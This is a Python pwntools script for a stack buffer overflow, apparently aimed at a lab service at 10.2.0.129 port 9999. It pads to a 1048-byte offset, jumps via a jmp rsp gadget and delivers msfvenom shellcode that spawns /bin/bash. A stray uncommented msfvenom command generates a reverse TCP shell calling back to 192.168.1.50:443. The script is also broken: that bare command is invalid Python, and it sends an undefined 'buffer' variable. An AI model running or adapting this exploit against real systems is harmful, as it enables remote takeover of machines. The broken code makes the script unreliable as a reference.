import os
import socket
import sys
import time
from pwn import *

host = '10.2.0.129'
port = 9999

offset = 1048

jmp_rsp = 0x400928

# msfvenom -p linux/x64/exec CMD=/bin/bash -f python -b '\x0a\x00' --var-name shellcode

shellcode = b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xea\x43\xdf"
shellcode += b"\x42\x55\xfb\x65\x98\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x80\x78\x87\xdb\x1d"
shellcode += b"\x40\x4a\xfa\x83\x2d\xf0\x31\x3d\xfb\x36\xd0"
shellcode += b"\x63\xa4\xb7\x6f\x36\xfb\x65\xd0\x63\xa5\x8d"
shellcode += b"\xaa\x5f\xfb\x65\x98\xc5\x21\xb6\x2c\x7a\x99"
shellcode += b"\x04\xeb\x82\x43\x89\x15\x1d\x72\x83\x97\xef"
shellcode += b"\x43\xdf\x42\x55\xfb\x65\x98"

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=443 -f python -b '\x0a\x00' --var-name shellcode


payload = b"A"*offset + p64(jmp_rsp) + b"\x90"*10 + shellcode 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.recv(1024)
s.send(buffer)



